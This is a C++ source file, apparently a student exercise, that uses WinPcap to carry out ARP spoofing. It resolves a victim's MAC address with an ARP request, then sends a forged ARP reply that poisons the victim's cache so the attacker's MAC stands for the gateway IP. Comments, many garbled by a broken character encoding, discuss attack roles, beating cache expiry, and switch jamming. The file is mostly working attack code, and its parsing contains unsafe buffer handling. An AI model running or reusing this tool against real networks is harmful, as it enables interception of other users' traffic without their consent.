#pragma comment(lib, "ws2_32.lib")
//strncmp -> memcmp
//strncpy -> memcpy
//char->uint_8
//short->uint_16
//#pragma pack(push, 1)
//#pragma pack(pop)... byte alignment
//memcmp���� uint32_t�� ���°�... ==������ ����� �����ϵ���..�սô�.
//or == ������ overriding (mac, ip�� class�� �ȴ�. parsing�� �ٲ��)
//��� ����
//Attacker�� Sender���� Receiver(target)���� ���� ��Ŷ�� ���� �;� spoofing�� �õ��Ѵ�. sender�� target�̴�.
//arp table ���� �ð��� Ǯ���� ������, cache expiration time�� ���� ����. �̴� sender (gateway)�� broadcast�� "who has ~"��Ŷ�� ���� ���̹Ƿ�, �� ��Ŷ�� Ȯ�����ڸ��� �����ָ� �ȴ�.
//while ������ ������ �ȴ뿵~
//vista������ broadcast�� �ƴ϶�unicast�� ������.
//arp_spoof wln0 10.2<sender> 10.1<target>

//���� ����Ϳ�����, ����� A�� �װ� ����� B�� ��Ƴ��� ����� B�� ARP redirect(����Ʈ���̰� �ٲ������ �˸��� ��Ŷ)�� broadcast�� ������.

//switch jamming ���� �����ϱ� -> dummy hub�� �ȵǰ�, �׳� ��Ʈ��ũ�� �״´�. �̰ź��� arp spoofing�� �� ȿ�����̴�.

#include <iostream>
#include <pcap.h>
#include <limits.h>
#include <tchar.h>
#include <string.h>
#include <ctype.h>
#include "getmymacip.h"

//Ethernet Name
//{6EF37E61-C314-41AB-BCCC-F1D5F1C3EAFA}

#define MAC_LEN 6
#define IPV4_LEN 4
#define ETHERTYPE 0x0001
#define ETHERTYPE_IP 0x0800
#define ETHERTYPE_ARP 0x0806
#define ARP_LEN 42	//define��� static const
#define ARP_REPLY_TYPE 0

typedef struct ethernet_header {
	uint8_t dest[MAC_LEN];
	uint8_t sour[MAC_LEN];
	uint16_t type;	//2byte
}ETHER_HDR;
typedef struct arp_header {
	uint16_t type;
	uint16_t protocol_type;
	uint8_t hrdAddr;	//hardware address
	uint8_t prtAddr;	//protocol address
	uint16_t opcode;	//1 request, 2 reply, 3 RARP request, 4 RARP reply
	uint8_t send_mac[MAC_LEN];
	uint8_t send_ip[IPV4_LEN];
	uint8_t recv_mac[MAC_LEN];
	uint8_t recv_ip[IPV4_LEN];
}ARP_HDR;
typedef struct ipv4_header {
	uint8_t ip_header_len : 4;	//4bit
	uint8_t ip_ver : 4;				//4bit
	uint8_t ip_tos;	//type of service
	uint16_t ip_total_length;	//total ip length, no ethernet header
	uint16_t ip_pid;	//packet id

	uint8_t ip_frag_offset;	//fragmented�� ��Ŷ�� ���, �̰� �� ��°����?
	uint8_t ip_ttl;	//time to live
	uint8_t ip_protocol;	//ip protocol
								//TCP 0x06, UDP 0x11
	uint16_t ip_checksum;
	uint32_t ip_srcaddr;
	uint32_t ip_destaddr;
}IPV4_HDR;
typedef struct IP {
	uint8_t ip[IPV4_LEN];
	bool operator == (struct IP& r) {
		for (int i = 0; i < IPV4_LEN; i++) {
			if (ip[i] != r.ip[i])
				return false;
		}
		return true;
	}
	void operator = (struct IP& r) {
		for (int i = 0; i < IPV4_LEN; i++) {
			ip[i] = r.ip[i];
		}
	}
}IP;
typedef struct MAC {
	uint8_t mac[MAC_LEN];
	bool operator == (struct MAC& r) {
		for (int i = 0; i < MAC_LEN; i++) {
			if (mac[i] != r.mac[i])
				return false;
		}
		return true;
	}
	void operator = (struct MAC& r) {
		for (int i = 0; i < MAC_LEN; i++) {
			mac[i] = r.mac[i];
		}
	}
}MAC;

//target��, ������ ���̺��� �����ϰ��� �ϴ� ����. (����Ʈ����ip, ��mac)
MAC sender_mac;// { 0xcc, 0x2f, 0x71, 0x59, 0x64, 0x74 };	//������ ���ؼ��� �������� mac�ּҰ� ������. type�� reply
IP sender_ip;// { 192, 168, 43, 1 };//{ 192, 168, 43, 97 };	//�����Ϸ��� gateway ip�ּҰ� ���� ��.
MAC destination_mac;// = { 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 };		//���̺� ���� ���
IP destination_ip;// = { 0, 0, 0, 0 };
MAC my_mac;
IP my_ip;
using namespace std;


void ipParser(char* ip, IP* destination_ip) {
	char* ptr = ip;
	for (int i = 0; *ptr; i++) {
		if (*ptr < '0' || *ptr > '9')
			ptr++;
		destination_ip->ip[i] = (uint8_t)strtol(ptr, &ptr, 10);
	}		
}
void macParser(char* mac, MAC* destination_mac) {
	char* ptr = mac;
	for (int i = 0; i < 20; i++)				//changing capital alpha into small alpha
		mac[i] = tolower(mac[i]);

	for (int i = 0; *ptr; i++) {
		if (!isdigit(*ptr) && !islower(*ptr))	//alien character, when not a small alphabet
			ptr++;
		destination_mac->mac[i] = (uint8_t)strtol(ptr, &ptr, 16);
	}
}
void printPacket(uint8_t* packet, int packet_size) {
	for (int i = 0; i < packet_size; i++) {
	if (!(i % 16))
	printf("\n");
	printf("%02x ", packet[i]);
	}
}
int sendARPrequest(pcap_t* fp, IP* target, IP* sender) {
	
	int packet_idx = 0;
	ETHER_HDR eth;
	ARP_HDR arp;
	uint8_t packet[1500];
	memset(&eth, 0, sizeof(eth));
	memset(&arp, 0, sizeof(arp));
	memset(&packet, 0, sizeof(packet));

	for (int i = 0; i < MAC_LEN; i++) {		//mac of ethernet, arp header
		eth.sour[i] = sender_mac.mac[i];
		eth.dest[i] = 0xff;
		arp.send_mac[i] = sender_mac.mac[i];	//target mac�� gateway��ô pretending�ϴ� mac�ּҷ�, attacker�� mac�̴�.
		arp.recv_mac[i] = 0x00;
	}
	eth.type = htons(ETHERTYPE_ARP);

	memcpy(packet, &eth, sizeof(eth));
	packet_idx += sizeof(eth);

	arp.type = htons(ETHERTYPE);			//ethernet type
	arp.protocol_type = htons(ETHERTYPE_IP);
	arp.hrdAddr = MAC_LEN;					//hardware size. ���⼭ hardware�� mac�ּҸ� ����.
	arp.prtAddr = IPV4_LEN;					//protocol size. ���⼭ ipv4���������� ����, �翬�� �ּҴ� ip�̴�.
	arp.opcode = htons(0x0001);	//request
	for (int i = 0; i < IPV4_LEN; i++) {	//ip of arp
		arp.send_ip[i] = sender_ip.ip[i];		//actual my ip, ����ᵵ �ȴٴ���
		arp.recv_ip[i] = destination_ip.ip[i];	//victim ip
	}

	memcpy(packet + packet_idx, &arp, sizeof(arp));
	packet_idx += sizeof(arp);
	printPacket(packet, packet_idx);
	if (pcap_sendpacket(fp, packet, ARP_LEN)) {
		fprintf(stderr, "\nError sending the packet: \n", pcap_geterr(fp));
		return -1;
	}
	return 1;
}
//send arp packet and take mac of target
int arp_getmac(pcap_t* fp, IP* target_ip, MAC* mac_container, IP* sender_ip) {

	if (sendARPrequest(fp, target_ip, sender_ip) == -1)										//mac�� ���� ���� ���� ��Ŷ�� �ϳ� ����
		return -1;

	struct pcap_pkthdr h;
	const u_char* temp = pcap_next(fp, &h);
	int count = 1000;
	while (temp) {
		if (count-- < 0) {
			printf("ARP return isn't captured\n\n");
			return -1;
		}
		if (temp[12] == 0x08 && temp[13] == 0x06) {											//ARP��Ŷ���� Ȯ��
			if (!memcmp((const char*)target_ip->ip, (const char*)temp + 28, IPV4_LEN)) {	//28 ~ 31�� target ip�� ������
																								//printPacket((uint8_t*)temp, ARP_LEN);								//22 ~ 27 mac ����
				memcpy((char*)mac_container->mac, (char*)temp + 22, MAC_LEN);
				printf("Mac address is captured\n");
				break;
			}
		}
		temp = pcap_next(fp, &h);
	}
}
int sendPacket(pcap_t* fp, int type) {
	ETHER_HDR eth;
	uint8_t packet[1500];
	int packet_idx = 0;
	memset(&eth, 0, sizeof(eth));
	memset(&packet, 0, sizeof(packet));

	for (int i = 0; i < MAC_LEN; i++) {		//mac of ethernet, arp header
		eth.sour[i] = sender_mac.mac[i];
		eth.dest[i] = destination_mac.mac[i];
	}

	if (type == ARP_REPLY_TYPE) {							//when arp
		ARP_HDR arp;
		memset(&arp, 0, sizeof(arp));

		eth.type = htons(ETHERTYPE_ARP);		//only for ARP
		memcpy(packet, &eth, sizeof(eth));
		packet_idx += sizeof(eth);
		arp.type = htons(ETHERTYPE);			//ethernet type
		arp.protocol_type = htons(ETHERTYPE_IP);
		arp.hrdAddr = MAC_LEN;					//hardware size. ���⼭ hardware�� mac�ּҸ� ����.
		arp.prtAddr = IPV4_LEN;					//protocol size. ���⼭ ipv4���������� ����, �翬�� �ּҴ� ip�̴�.
		arp.opcode = htons(0x0002);	//attack, reply
		for (int i = 0; i < IPV4_LEN; i++) {	//ip of arp
			arp.send_ip[i] = sender_ip.ip[i];		//arp���� source ip�� pretending ip(gateway)�̴�.
			arp.recv_ip[i] = destination_ip.ip[i];	//victim ip
		}
		for (int i = 0; i < MAC_LEN; i++) {		//mac of arp header
			arp.send_mac[i] = sender_mac.mac[i];
			arp.recv_mac[i] = destination_mac.mac[i];
		}
		memcpy(packet + packet_idx, &arp, sizeof(arp));
		packet_idx += sizeof(arp);

		if (pcap_sendpacket(fp, packet, ARP_LEN)) {
			fprintf(stderr, "\nError sending the packet: \n", pcap_geterr(fp));
			return -1;
		}
		printPacket(packet, 42);
		Sleep(500);//0.5s
	}
		
}

int main(int argc, char* argv[]) {
	pcap_if_t* alldevs;
	pcap_t* fp;
	//findalldevs ���� https://www.winpcap.org/docs/docs_412/html/structpcap__if.html
	int inum = -1;	int i = 0;
	char errbuf[PCAP_ERRBUF_SIZE];
	if (pcap_findalldevs(&alldevs, errbuf) == -1) {
		fprintf(stderr, "Error to find devices: %s\n", errbuf);
		exit(1);
	}

	//pcap_t ����ü ���� https://blog.silnex.kr/libpcapstruct-pcap_t/
	for (pcap_if_t* dev = alldevs; dev; dev = dev->next) {
		printf("%d. %s", ++i, dev->name);
		int idx;
		for (idx = 0; dev->name[idx] != '{'; idx++);
		if (!strcmp(dev->name + idx, argv[1]))
			inum = i;
		if (dev->description)
			printf(" (%s)\n", dev->description);
		else
			printf(" (No description available)\n");
	}

	if (i == 0) {
		printf("\nNo interfaces found\n");
		return -1;
	}

//	printf("Enter the interface number(1-%d): ", i);
//	scanf("%d", &inum);

	if (inum<1 || inum>i) {
		printf("\nInvalid number\n");
		pcap_freealldevs(alldevs);
		return -1;
	}

	i = 0;
	pcap_if_t* dev = alldevs;
	for ( ; i < inum - 1; dev = dev->next, i++);
	//list ��ȸ�Ͽ� ���õ� interface�� �Ѿ.

	//pcap_open_live, fp ���� https://wiki.kldp.org/KoreanDoc/html/Libpcap-KLDP/function.html
	fp = pcap_open_live(dev->name, USHRT_MAX + 1, 0, 1000, errbuf);
	//device name, capturing size, promiscuous mode, read timeout, error buffer
	if (!fp) {
		fprintf(stderr, "\nCannot open the adapter.\n%s is not supported by WinPcap\n", argv[1]);
		return -1;
	}
	
//INPUT---------------------------------------------------------------------------------------------------------------------
	char interfaceName[100];
	char ip[30];
	//mydevice
	//{6EF37E61-C314-41AB-BCCC-F1D5F1C3EAFA}
	//name, destination_ip, target_ip
	strncpy(interfaceName, argv[1], strlen(argv[1]));	//device name
	interfaceName[strlen(argv[1])] = 0;
	memcpy(ip, argv[2], strlen(argv[2]));				//192.168.43.?	(destination, ?�� �ް� �ִ�, ���̺� ���� ���)
	ipParser(ip, &destination_ip);
	memset(ip, 0, sizeof(ip));
	memcpy(ip, argv[3], strlen(argv[3]));				//192.168.43.1 (sender, 1�� ������ �ִ� ô)
	ipParser(ip, &sender_ip);

	//get destination mac using ip 
	macParser(getMyMac(interfaceName), &my_mac);		//�� mac ���� ���ϱ�
	ipParser(getMyIP(interfaceName), &my_ip);			//�� ip���� ���ϱ�
	sender_mac = my_mac;								//���⼭ sender_mac�� �� ������ ����

	if (arp_getmac(fp, &destination_ip, &destination_mac, &sender_ip) == -1)		//destination_mac ���ϱ�
		exit(0);																	//sender_ip, destination_ip�� �̹� �־���. ���⼭ ��� �� 

//Packet manupulation-------------------------------------------------------------------------------------------------------
	
	sendPacket(fp, ARP_REPLY_TYPE);
}